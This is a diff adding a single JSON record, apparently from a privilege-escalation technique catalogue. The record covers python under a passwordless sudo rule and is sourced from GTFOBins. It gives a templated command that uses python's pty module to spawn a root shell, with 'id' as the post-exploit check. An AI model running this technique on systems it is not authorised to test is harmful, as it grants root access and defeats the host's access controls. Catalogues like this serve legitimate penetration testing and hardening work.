@@ -1,0 +1,1 @@
+{"id":"sudo_python","category":"SUDO_NOPASSWD_CUSTOM","binary":"python","cve":null,"exploitation":["sudo {{binary}} -c 'import pty; pty.spawn(\"{{shell}}\")'"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
